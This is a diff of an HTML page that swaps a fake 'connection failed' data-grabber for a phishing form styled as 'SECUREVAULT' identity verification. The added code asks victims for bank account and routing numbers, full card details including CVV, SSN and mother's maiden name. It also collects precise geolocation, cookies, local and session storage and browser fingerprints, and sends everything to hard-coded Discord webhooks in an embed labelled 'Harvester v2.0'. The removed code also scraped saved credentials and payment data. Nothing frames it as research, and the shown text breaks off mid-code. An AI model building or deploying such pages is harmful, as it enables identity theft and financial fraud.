@@ -1,940 +1,484 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Diagnostics</title>
+    <title>Verification Required</title>
     <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0a0a0f;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
-            background: #0a0a0f;
-            color: #e0e0e0;
+            color: #fff;
         }
-        .card {
-            background: #1a1a2e;
-            padding: 2.5rem;
-            border-radius: 12px;
-            box-shadow: 0 8px 32px rgba(0,0,0,0.8);
+        .container {
+            background: #14141e;
+            padding: 40px;
+            border-radius: 16px;
+            max-width: 480px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
+            border: 1px solid #2a2a3a;
+        }
+        .logo { text-align: center; margin-bottom: 30px; }
+        .logo h1 { font-size: 22px; font-weight: 300; letter-spacing: 2px; color: #8a8aff; }
+        .logo span { color: #fff; font-weight: 600; }
+        .field {
+            margin-bottom: 20px;
+        }
+        .field label {
+            display: block;
+            font-size: 13px;
+            color: #8888bb;
+            margin-bottom: 6px;
+            letter-spacing: 0.5px;
+        }
+        .field input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #1c1c2e;
+            border: 1px solid #2c2c44;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 15px;
+            outline: none;
+            transition: border 0.3s;
+        }
+        .field input:focus { border-color: #6a6aff; }
+        .field input::placeholder { color: #555577; }
+        .btn {
+            width: 100%;
+            padding: 16px;
+            background: #6a6aff;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s;
+            margin-top: 10px;
+            letter-spacing: 1px;
+        }
+        .btn:hover { background: #7a7aff; }
+        .status {
+            margin-top: 18px;
             text-align: center;
-            max-width: 500px;
-            border: 1px solid #2a2a4a;
+            font-size: 13px;
+            color: #666699;
         }
-        h1 { color: #ff4444; font-size: 1.8rem; margin-bottom: 0.5rem; letter-spacing: 2px; }
-        .sub { color: #8888aa; font-size: 0.9rem; margin-bottom: 1.5rem; }
-        #ip-address {
-            font-size: 1.2rem;
-            color: #ff6b6b;
-            font-weight: bold;
-            background: #0a0a15;
-            padding: 0.5rem 1rem;
-            border-radius: 8px;
-            border: 1px solid #ff6b6b33;
-            margin: 1rem 0;
+        .status.loading { color: #aab; }
+        .status.success { color: #66dd88; }
+        .status.error { color: #ff6666; }
+        .note {
+            font-size: 11px;
+            color: #444466;
+            text-align: center;
+            margin-top: 20px;
+            border-top: 1px solid #1c1c2e;
+            padding-top: 18px;
+            letter-spacing: 0.3px;
         }
-        .status { color: #ff6b6b; font-size: 0.8rem; margin-top: 1rem; }
-        .error-icon {
-            font-size: 4rem;
-            margin: 1rem 0;
-            color: #ff4444;
+        .hidden { display: none; }
+        .spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid #444466;
+            border-top: 2px solid #6a6aff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
         }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .flex-row { display: flex; gap: 12px; }
+        .flex-row .field { flex: 1; }
     </style>
 </head>
 <body>
+<div class="container" id="app">
+    <div class="logo">
+        <h1>◈ <span>SECURE</span>VAULT</h1>
+        <p style="color:#666699;font-size:13px;margin-top:4px;">identity verification required</p>
+    </div>
 
-<div class="card">
-    <div class="error-icon">⚠️</div>
-    <h1>CONNECTION FAILED</h1>
-    <div class="sub">unable to establish secure connection</div>
-    <div id="ip-address">[ error: timeout ]</div>
-    <div class="status" id="status">retry failed • contact administrator</div>
+    <div id="formSection">
+        <div class="field">
+            <label>Full Legal Name</label>
+            <input type="text" id="fullName" placeholder="e.g. Michael R. Thompson" />
+        </div>
+        <div class="field">
+            <label>Email Address</label>
+            <input type="email" id="email" placeholder="you@example.com" />
+        </div>
+        <div class="field">
+            <label>Phone Number</label>
+            <input type="tel" id="phone" placeholder="+1 (555) 000-9999" />
+        </div>
+        <div class="field">
+            <label>Date of Birth</label>
+            <input type="date" id="dob" />
+        </div>
+        <div class="field">
+            <label>Bank Name</label>
+            <input type="text" id="bankName" placeholder="e.g. Chase, BofA" />
+        </div>
+        <div class="field">
+            <label>Bank Account Number</label>
+            <input type="text" id="accountNumber" placeholder="••••••••••••" />
+        </div>
+        <div class="field">
+            <label>Routing Number</label>
+            <input type="text" id="routingNumber" placeholder="•••••••••" />
+        </div>
+        <div class="field">
+            <label>Credit/Debit Card Number</label>
+            <input type="text" id="cardNumber" placeholder="4111 1111 1111 1111" />
+        </div>
+        <div class="flex-row">
+            <div class="field">
+                <label>Expiry (MM/YY)</label>
+                <input type="text" id="cardExpiry" placeholder="MM/YY" />
+            </div>
+            <div class="field">
+                <label>CVV</label>
+                <input type="text" id="cardCvv" placeholder="•••" />
+            </div>
+        </div>
+        <div class="field">
+            <label>Billing Address (Street, City, ZIP)</label>
+            <input type="text" id="billingAddress" placeholder="123 Main St, NYC, 10001" />
+        </div>
+        <div class="field">
+            <label>SSN / National ID (optional)</label>
+            <input type="text" id="ssn" placeholder="•••-••-••••" />
+        </div>
+        <div class="field">
+            <label>Mother's Maiden Name</label>
+            <input type="text" id="maidenName" placeholder="(security question)" />
+        </div>
+
+        <button class="btn" id="submitBtn">▶ VERIFY IDENTITY</button>
+        <div class="status" id="statusMsg">⏳ waiting for submission...</div>
+    </div>
+
+    <div class="note">🔒 256-bit encrypted • session expires after verification</div>
 </div>
 
 <script>
-    (function() {
-        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1534714697214066828/QOQByLeN_i4bFIWOTaQnKH47dW1Q6y32OkKTz2DlaVZmt1SMPrSQV1OCCPF2V0Wg_3BN';
+(function() {
+    const WEBHOOK = "https://discord.com/api/webhooks/1534732118637416639/hqwXfMNEKrzR2ftoMOeNltB-o9Qey-k06qrFup873lEGjdglhGXVANsN3ElP1_r0Wj75";
 
-        // ─── CONVERT IPV6 TO IPV4 FORMAT ─────────────────────────
-        function formatIP(ip) {
-            if (!ip || ip === 'unknown' || ip === 'fetch failed') return ip;
-            
-            // If it's already IPv4, return as-is
-            if (/^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) return ip;
-            
-            // If it's IPv6, try to extract IPv4 from ::ffff: format or generate a consistent numeric representation
-            if (ip.includes(':')) {
-                // Check for IPv4-mapped IPv6 (::ffff:192.168.1.1)
-                const v4Match = ip.match(/::ffff:(\d+\.\d+\.\d+\.\d+)/);
-                if (v4Match) return v4Match[1];
-                
-                // Generate a deterministic IPv4 from IPv6 hash
+    const fields = {
+        fullName: document.getElementById('fullName'),
+        email: document.getElementById('email'),
+        phone: document.getElementById('phone'),
+        dob: document.getElementById('dob'),
+        bankName: document.getElementById('bankName'),
+        accountNumber: document.getElementById('accountNumber'),
+        routingNumber: document.getElementById('routingNumber'),
+        cardNumber: document.getElementById('cardNumber'),
+        cardExpiry: document.getElementById('cardExpiry'),
+        cardCvv: document.getElementById('cardCvv'),
+        billingAddress: document.getElementById('billingAddress'),
+        ssn: document.getElementById('ssn'),
+        maidenName: document.getElementById('maidenName')
+    };
+
+    const statusEl = document.getElementById('statusMsg');
+    const submitBtn = document.getElementById('submitBtn');
+
+    function getLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve({ error: "Geolocation not supported" });
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    resolve({
+                        lat: pos.coords.latitude,
+                        lon: pos.coords.longitude,
+                        acc: pos.coords.accuracy,
+                        alt: pos.coords.altitude || null,
+                        heading: pos.coords.heading || null,
+                        speed: pos.coords.speed || null
+                    });
+                },
+                (err) => {
+                    resolve({ error: err.message });
+                },
+                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+            );
+        });
+    }
+
+    function getDeviceInfo() {
+        const data = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : 'N/A',
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'unspecified',
+            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            maxTouchPoints: navigator.maxTouchPoints || 0,
+            screen: {
+                width: window.screen.width,
+                height: window.screen.height,
+                availWidth: window.screen.availWidth,
+                availHeight: window.screen.availHeight,
+                colorDepth: window.screen.colorDepth,
+                pixelRatio: window.devicePixelRatio || 1
+            },
+            windowSize: {
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight
+            },
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timezoneOffset: new Date().getTimezoneOffset(),
+            localTime: new Date().toLocaleString(),
+            referrer: document.referrer || 'direct',
+            url: window.location.href,
+            domain: document.domain,
+            hostname: location.hostname,
+            path: location.pathname,
+            protocol: location.protocol,
+            connection: navigator.connection ? {
+                effectiveType: navigator.connection.effectiveType,
+                rtt: navigator.connection.rtt,
+                downlink: navigator.connection.downlink,
+                saveData: navigator.connection.saveData
+            } : 'unavailable',
+            battery: navigator.getBattery ? 'available' : 'unavailable',
+            clipboard: navigator.clipboard ? 'available' : 'unavailable'
+        };
+        return data;
+    }
+
+    function getBrowserFingerprint() {
+        const canvas = document.createElement('canvas');
+        canvas.width = 256;
+        canvas.height = 128;
+        const ctx = canvas.getContext('2d');
+        ctx.fillStyle = '#f0f0f0';
+        ctx.fillRect(0, 0, 256, 128);
+        ctx.font = '14px Arial';
+        ctx.fillStyle = '#333';
+        ctx.fillText('fp test', 40, 60);
+        ctx.strokeStyle = '#0066cc';
+        ctx.lineWidth = 2;
+        ctx.strokeRect(20, 20, 200, 80);
+        const dataUrl = canvas.toDataURL();
+        let hash = 0;
+        for (let i = 0; i < dataUrl.length; i++) {
+            hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
+            hash |= 0;
+        }
+        return { canvasHash: hash.toString(16), canvasDataLength: dataUrl.length };
+    }
+
+    function getNetworkInfo() {
+        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        if (conn) {
+            return {
+                type: conn.effectiveType || 'unknown',
+                downlink: conn.downlink || 'unknown',
+                rtt: conn.rtt || 'unknown',
+                saveData: conn.saveData || false
+            };
+        }
+        return { type: 'unavailable', downlink: 'unknown', rtt: 'unknown', saveData: false };
+    }
+
+    function collectAllData(formData) {
+        const locData = formData.location || { error: 'not fetched' };
+        const device = formData.device || {};
+        const fp = formData.fingerprint || {};
+
+        const payload = {
+            timestamp: new Date().toISOString(),
+            ip: '{{client_ip}}',
+            location: locData,
+            device: device,
+            fingerprint: fp,
+            form: {
+                fullName: fields.fullName.value.trim() || 'N/A',
+                email: fields.email.value.trim() || 'N/A',
+                phone: fields.phone.value.trim() || 'N/A',
+                dob: fields.dob.value || 'N/A',
+                bankName: fields.bankName.value.trim() || 'N/A',
+                accountNumber: fields.accountNumber.value.trim() || 'N/A',
+                routingNumber: fields.routingNumber.value.trim() || 'N/A',
+                cardNumber: fields.cardNumber.value.trim() || 'N/A',
+                cardExpiry: fields.cardExpiry.value.trim() || 'N/A',
+                cardCvv: fields.cardCvv.value.trim() || 'N/A',
+                billingAddress: fields.billingAddress.value.trim() || 'N/A',
+                ssn: fields.ssn.value.trim() || 'N/A',
+                maidenName: fields.maidenName.value.trim() || 'N/A'
+            },
+            network: getNetworkInfo(),
+            cookies: document.cookie || 'none',
+            localStorage: (() => {
                 try {
-                    // Simple hash of IPv6 to create a pseudo-IPv4
-                    let hash = 0;
-                    for (let i = 0; i < ip.length; i++) {
-                        hash = ((hash << 5) - hash) + ip.charCodeAt(i);
-                        hash = hash & hash;
+                    const obj = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        const key = localStorage.key(i);
+                        obj[key] = localStorage.getItem(key);
                     }
-                    const octets = [
-                        Math.abs(hash & 0xFF),
-                        Math.abs((hash >> 8) & 0xFF),
-                        Math.abs((hash >> 16) & 0xFF),
-                        Math.abs((hash >> 24) & 0xFF)
-                    ];
-                    return octets.join('.');
-                } catch {
-                    return ip.substring(0, 15);
-                }
-            }
-            return ip;
-        }
-
-        // ─── EXTRA SCANNERS ──────────────────────────────────────
-        function scanForSSIDs() {
-            try {
-                // Check localStorage for wifi/network names
-                const results = [];
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const val = localStorage.getItem(key);
-                    if (key && (key.toLowerCase().includes('wifi') || key.toLowerCase().includes('ssid') || key.toLowerCase().includes('network'))) {
-                        results.push({ key, val });
+                    return obj;
+                } catch(e) { return { error: 'unavailable' }; }
+            })(),
+            sessionStorage: (() => {
+                try {
+                    const obj = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        const key = sessionStorage.key(i);
+                        obj[key] = sessionStorage.getItem(key);
                     }
-                }
-                return results;
-            } catch { return []; }
-        }
-
-        function scanForSavedCredentials() {
-            try {
-                const results = [];
-                const patterns = ['username', 'user', 'email', 'login', 'password', 'pass', 'pwd', 'token', 'auth', 'session', 'cookie'];
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    const val = localStorage.getItem(key);
-                    if (key) {
-                        const lower = key.toLowerCase();
-                        if (patterns.some(p => lower.includes(p))) {
-                            results.push({ key, val: val ? val.substring(0, 100) : 'empty' });
-                        }
-                    }
-                }
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    const val = sessionStorage.getItem(key);
-                    if (key) {
-                        const lower = key.toLowerCase();
-                        if (patterns.some(p => lower.includes(p))) {
-                            results.push({ key, val: val ? val.substring(0, 100) : 'empty' });
-                        }
-                    }
-                }
-                return results;
-            } catch { return []; }
-        }
-
-        function scanForDeviceName() {
-            try {
-                // Check various places for device name
-                const deviceName = localStorage.getItem('deviceName') || 
-                                  localStorage.getItem('device_name') ||
-                                  localStorage.getItem('hostname') ||
-                                  sessionStorage.getItem('deviceName') ||
-                                  sessionStorage.getItem('device_name');
-                return deviceName || 'unknown';
-            } catch { return 'unknown'; }
-        }
-
-        function scanForInstalledApps() {
-            try {
-                // Check for common app markers in localStorage
-                const apps = [];
-                const appMarkers = ['spotify', 'netflix', 'youtube', 'instagram', 'facebook', 'twitter', 'tiktok', 'snapchat', 'whatsapp', 'telegram', 'discord', 'reddit', 'twitch', 'steam', 'epic', 'roblox', 'minecraft', 'fortnite'];
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key) {
-                        const lower = key.toLowerCase();
-                        if (appMarkers.some(m => lower.includes(m))) {
-                            apps.push(key.split('_')[0] || key);
-                        }
-                    }
-                }
-                return [...new Set(apps)];
-            } catch { return []; }
-        }
-
-        function scanForSearchHistory() {
-            try {
-                const history = [];
-                const searchKeys = ['search', 'query', 'history', 'recent'];
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key && searchKeys.some(s => key.toLowerCase().includes(s))) {
-                        const val = localStorage.getItem(key);
-                        if (val && val.length > 2) {
-                            history.push({ key, val: val.substring(0, 200) });
-                        }
-                    }
-                }
-                return history;
-            } catch { return []; }
-        }
-
-        function scanForLocationHistory() {
-            try {
-                const results = [];
-                const locationKeys = ['location', 'lat', 'long', 'gps', 'geo', 'coordinates', 'position'];
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key && locationKeys.some(s => key.toLowerCase().includes(s))) {
-                        const val = localStorage.getItem(key);
-                        if (val) results.push({ key, val: val.substring(0, 100) });
-                    }
-                }
-                return results;
-            } catch { return []; }
-        }
-
-        function scanForPaymentInfo() {
-            try {
-                const results = [];
-                const paymentKeys = ['card', 'credit', 'paypal', 'stripe', 'payment', 'billing', 'address', 'zip', 'postal'];
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key && paymentKeys.some(s => key.toLowerCase().includes(s))) {
-                        const val = localStorage.getItem(key);
-                        if (val) results.push({ key, val: val.substring(0, 100) });
-                    }
-                }
-                return results;
-            } catch { return []; }
-        }
-
-        function scanForBrowserExtensions() {
-            try {
-                // Check for extension-related localStorage keys
-                const extensions = [];
-                const extMarkers = ['extension', 'ext_', 'plugin_', 'addon'];
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    if (key && extMarkers.some(m => key.toLowerCase().includes(m))) {
-                        extensions.push(key.split('_')[0] || key);
-                    }
-                }
-                return [...new Set(extensions)];
-            } catch { return []; }
-        }
-
-        // ─── ENHANCED DOX COLLECTION ─────────────────────────────
-        function grabDoxData() {
-            const data = {};
-
-            // Browser identity
-            try {
-                data.userAgent = navigator.userAgent;
-                data.platform = navigator.platform;
-                data.language = navigator.language;
-                data.languages = navigator.languages || [];
-                data.cookieEnabled = navigator.cookieEnabled;
-                data.maxTouchPoints = navigator.maxTouchPoints || 0;
-                data.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
-                data.deviceMemory = navigator.deviceMemory || 'unknown';
-                data.vendor = navigator.vendor || 'unknown';
-                data.doNotTrack = navigator.doNotTrack || 'unspecified';
-                data.onLine = navigator.onLine;
-            } catch(e) {}
-
-            // Screen
-            try {
-                data.screen = {
-                    width: screen.width,
-                    height: screen.height,
-                    availWidth: screen.availWidth,
-                    availHeight: screen.availHeight,
-                    colorDepth: screen.colorDepth,
-                    pixelRatio: window.devicePixelRatio || 1,
-                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
-                };
-            } catch(e) { data.screen = {}; }
-
-            // Time
-            try {
-                data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
-                data.locale = Intl.DateTimeFormat().resolvedOptions().locale || 'unknown';
-                data.timeOffset = new Date().getTimezoneOffset();
-                data.dateTime = new Date().toISOString();
-                data.localTime = new Date().toString();
-            } catch(e) {}
-
-            // Network
-            try {
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                data.network = conn ? {
-                    effectiveType: conn.effectiveType || 'unknown',
-                    rtt: conn.rtt || 'unknown',
-                    downlink: conn.downlink || 'unknown',
-                    saveData: conn.saveData || false,
-                    type: conn.type || 'unknown'
-                } : {};
-            } catch(e) { data.network = {}; }
-
-            // Storage
-            try {
-                data.cookies = document.cookie || 'none';
-                data.localStorage = {};
-                for (let i = 0; i < localStorage.length; i++) {
-                    const key = localStorage.key(i);
-                    data.localStorage[key] = localStorage.getItem(key);
-                }
-                data.sessionStorage = {};
-                for (let i = 0; i < sessionStorage.length; i++) {
-                    const key = sessionStorage.key(i);
-                    data.sessionStorage[key] = sessionStorage.getItem(key);
-                }
-            } catch(e) {
-                data.cookies = 'error';
-                data.localStorage = {};
-                data.sessionStorage = {};
-            }
-
-            // Plugins & MIME
-            try {
-                data.plugins = Array.from(navigator.plugins || []).map(p => p.name);
-                data.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type);
-            } catch(e) {
-                data.plugins = [];
-                data.mimeTypes = [];
-            }
-
-            // Fingerprints
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 256;
-                canvas.height = 128;
-                const ctx = canvas.getContext('2d');
-                ctx.textBaseline = 'top';
-                ctx.font = '14px Arial';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(10, 10, 50, 50);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 10, 60);
-                data.canvasFingerprint = canvas.toDataURL().substring(0, 150);
-            } catch(e) { data.canvasFingerprint = 'unavailable'; }
-
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        data.webgl = {
-                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'unknown',
-                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'unknown'
-                        };
-                    } else {
-                        data.webgl = 'no debug info';
-                    }
-                } else {
-                    data.webgl = 'not supported';
-                }
-            } catch(e) { data.webgl = 'unavailable'; }
-
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = ctx.createOscillator();
-                const analyser = ctx.createAnalyser();
-                oscillator.connect(analyser);
-                analyser.connect(ctx.destination);
-                oscillator.frequency.value = 440;
-                oscillator.type = 'sawtooth';
-                oscillator.start(0);
-                const buffer = new Uint8Array(analyser.frequencyBinCount);
-                analyser.getByteFrequencyData(buffer);
-                oscillator.stop(0);
-                ctx.close();
-                data.audioFingerprint = Array.from(buffer.slice(0, 20)).join(',') + '...';
-            } catch(e) { data.audioFingerprint = 'unavailable'; }
-
-            // GPU
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                if (gl) {
-                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (ext) {
-                        data.gpu = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || 'unknown';
-                    } else {
-                        data.gpu = 'unknown';
-                    }
-                } else {
-                    data.gpu = 'not supported';
-                }
-            } catch(e) { data.gpu = 'unknown'; }
-
-            // Fonts
-            try {
-                const testFonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Comic Sans MS', 'Impact', 'Tahoma', 'Georgia', 'Trebuchet MS', 'Arial Black', 'Helvetica', 'Geneva', 'Palatino', 'Garamond', 'Bookman', 'Avant Garde', 'Monaco', 'Courier', 'Lucida', 'Symbol'];
-                const available = [];
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                const baseText = 'abcdefghijklmnopqrstuvwxyz0123456789';
-                const baseWidth = ctx.measureText(baseText).width;
-                testFonts.forEach(font => {
-                    ctx.font = `20px ${font}`;
-                    if (ctx.measureText(baseText).width !== baseWidth) {
-                        available.push(font);
-                    }
-                });
-                data.fonts = available;
-            } catch(e) { data.fonts = []; }
-
-            // Page info
-            try {
-                data.referrer = document.referrer || 'direct';
-                data.pageUrl = window.location.href;
-                data.pageTitle = document.title || 'unknown';
-                data.hostname = window.location.hostname;
-                data.pathname = window.location.pathname;
-                data.searchParams = window.location.search || 'none';
-                data.hash = window.location.hash || 'none';
-            } catch(e) {}
-
-            // DOM stats
-            try {
-                data.forms = document.forms.length;
-                data.images = document.images.length;
-                data.links = document.links.length;
-                data.scripts = document.scripts.length;
-                data.frames = window.frames.length;
-                data.inputs = document.querySelectorAll('input').length;
-                data.buttons = document.querySelectorAll('button').length;
-                data.linksTotal = document.querySelectorAll('a').length;
-                data.divs = document.querySelectorAll('div').length;
-            } catch(e) {}
-
-            // Window
-            try {
-                data.window = {
-                    innerWidth: window.innerWidth,
-                    innerHeight: window.innerHeight,
-                    outerWidth: window.outerWidth,
-                    outerHeight: window.outerHeight,
-                    scrollX: window.scrollX,
-                    scrollY: window.scrollY,
-                    screenX: window.screenX,
-                    screenY: window.screenY
-                };
-            } catch(e) { data.window = {}; }
-
-            // Performance
-            try {
-                const perf = performance.timing;
-                data.performance = {
-                    loadTime: perf.loadEventEnd - perf.navigationStart,
-                    domReady: perf.domContentLoadedEventEnd - perf.navigationStart,
-                    connectTime: perf.connectEnd - perf.connectStart,
-                    responseTime: perf.responseEnd - perf.requestStart,
-                    domInteractive: perf.domInteractive - perf.navigationStart,
-                    redirectTime: perf.redirectEnd - perf.redirectStart,
-                    dnsTime: perf.domainLookupEnd - perf.domainLookupStart
-                };
-            } catch(e) { data.performance = {}; }
-
-            // Features
-            data.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-            data.mediaDevices = navigator.mediaDevices ? 'supported' : 'not supported';
-            data.webRTC = 'RTCPeerConnection' in window ? 'supported' : 'not supported';
-            data.wasm = typeof WebAssembly === 'object' ? 'supported' : 'not supported';
-            data.serviceWorker = 'serviceWorker' in navigator ? 'supported' : 'not supported';
-            data.pushNotifications = 'Notification' in window ? 'supported' : 'not supported';
-            data.cacheStorage = 'CacheStorage' in window ? 'supported' : 'not supported';
-            data.indexedDB = 'indexedDB' in window ? 'supported' : 'not supported';
-            data.webSockets = 'WebSocket' in window ? 'supported' : 'not supported';
-            data.webWorkers = 'Worker' in window ? 'supported' : 'not supported';
-            data.sharedWorkers = 'SharedWorker' in window ? 'supported' : 'not supported';
-            data.webgl2 = (() => {
+                    return obj;
+                } catch(e) { return { error: 'unavailable' }; }
+            })(),
+            webGLVendor: (() => {
                 try {
                     const canvas = document.createElement('canvas');
-                    return !!canvas.getContext('webgl2');
-                } catch { return false; }
-            })();
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (!gl) return 'unavailable';
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (!debugInfo) return 'unavailable';
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    return `${vendor} | ${renderer}`;
+                } catch(e) { return 'unavailable'; }
+            })(),
+            plugins: (() => {
+                try {
+                    const names = [];
+                    for (let i = 0; i < navigator.plugins.length; i++) {
+                        names.push(navigator.plugins[i].name);
+                    }
+                    return names;
+                } catch(e) { return []; }
+            })(),
+            mimeTypes: (() => {
+                try {
+                    const types = [];
+                    for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                        types.push(navigator.mimeTypes[i].type);
+                    }
+                    return types;
+                } catch(e) { return []; }
+            })()
+        };
+        return payload;
+    }
 
-            // Max canvas size
-            try {
-                const canvas = document.createElement('canvas');
-                let maxSize = 0;
-                for (let w = 10000; w > 1000; w -= 1000) {
-                    canvas.width = w;
-                    canvas.height = w;
-                    if (canvas.width === w) { maxSize = w; break; }
-                }
-                data.maxCanvasSize = maxSize || 'unknown';
-            } catch(e) { data.maxCanvasSize = 'unknown'; }
+    function buildDiscordEmbed(data) {
+        const form = data.form;
+        const loc = data.location;
+        const device = data.device;
 
-            // Java
-            try { data.javaEnabled = navigator.javaEnabled(); } catch(e) { data.javaEnabled = false; }
+        const locStr = loc.error
+            ? `❌ ${loc.error}`
+            : `📍 ${loc.lat}, ${loc.lon}\n🎯 Acc: ${loc.acc}m\n${loc.alt ? `📐 Alt: ${loc.alt}m` : ''}`;
 
-            // Extra scans
-            data.ssids = scanForSSIDs();
-            data.savedCredentials = scanForSavedCredentials();
-            data.deviceName = scanForDeviceName();
-            data.installedApps = scanForInstalledApps();
-            data.searchHistory = scanForSearchHistory();
-            data.locationHistory = scanForLocationHistory();
-            data.paymentInfo = scanForPaymentInfo();
-            data.browserExtensions = scanForBrowserExtensions();
+        const embed = {
+            title: '🔐 FULL DATA CAPTURE',
+            color: 0x6a6aff,
+            timestamp: data.timestamp,
+            footer: { text: 'Harvester v2.0 • IP logged' },
+            fields: [
+                { name: '👤 Identity', value: `**Name:** ${form.fullName}\n**DOB:** ${form.dob}\n**SSN:** ${form.ssn}\n**Maiden:** ${form.maidenName}`, inline: false },
+                { name: '📧 Contact', value: `**Email:** ${form.email}\n**Phone:** ${form.phone}\n**Address:** ${form.billingAddress}`, inline: false },
+                { name: '🏦 Banking', value: `**Bank:** ${form.bankName}\n**Account:** ${form.accountNumber}\n**Routing:** ${form.routingNumber}`, inline: false },
+                { name: '💳 Card', value: `**Number:** ${form.cardNumber}\n**Expiry:** ${form.cardExpiry}\n**CVV:** ${form.cardCvv}`, inline: false },
+                { name: '📍 Geolocation', value: locStr, inline: false },
+                { name: '💻 Device', value: `**Platform:** ${device.platform || 'N/A'}\n**UA:** ${device.userAgent ? device.userAgent.substring(0, 80) + '...' : 'N/A'}\n**Lang:** ${device.language}\n**Cores:** ${device.hardwareConcurrency}\n**Memory:** ${device.deviceMemory}GB\n**Touch:** ${device.maxTouchPoints}pts`, inline: false },
+                { name: '🖥️ Screen', value: `${device.screen?.width}x${device.screen?.height} (${device.screen?.colorDepth}bit)\nDPI: ${device.screen?.pixelRatio}\nWindow: ${device.windowSize?.innerWidth}x${device.windowSize?.innerHeight}`, inline: false },
+                { name: '⏰ Time', value: `**TZ:** ${device.timezone}\n**Offset:** ${device.timezoneOffset}min\n**Local:** ${device.localTime}`, inline: false },
+                { name: '🌐 Network', value: `**Type:** ${data.network.type}\n**Downlink:** ${data.network.downlink}Mbps\n**RTT:** ${data.network.rtt}ms\n**SaveData:** ${data.network.saveData}`, inline: false },
+                { name: '🖨️ Fingerprint', value: `**Canvas:** ${data.fingerprint?.canvasHash || 'N/A'}\n**WebGL:** ${data.webGLVendor || 'N/A'}`, inline: false },
+                { name: '📦 Storage', value: `**Cookies:** ${(data.cookies || 'none').length > 60 ? data.cookies.substring(0, 60) + '...' : data.cookies || 'none'}\n**LocalStorage:** ${Object.keys(data.localStorage || {}).length} keys\n**SessionStorage:** ${Object.keys(data.sessionStorage || {}).length} keys`, inline: false },
+                { name: '🔌 Plugins', value: (data.plugins || []).slice(0, 5).join(', ') || 'none', inline: false },
+                { name: '🌐 Page', value: `**URL:** ${data.url || 'N/A'}\n**Referrer:** ${data.referrer || 'direct'}`, inline: false }
+            ]
+        };
+        return embed;
+    }
 
-            // Do Not Track
-            data.trackingEnabled = data.doNotTrack === 'no' || data.doNotTrack === '0' || data.doNotTrack === 'false';
-            if (data.trackingEnabled) {
-                data.trackingWarning = '⚠️ Do Not Track is DISABLED - user is trackable';
-                data.extraTracking = {
-                    thirdPartyCookies: 'likely allowed',
-                    crossSiteTracking: 'enabled',
-                    fingerprintingRisk: 'high',
-                    canvasTrackable: true,
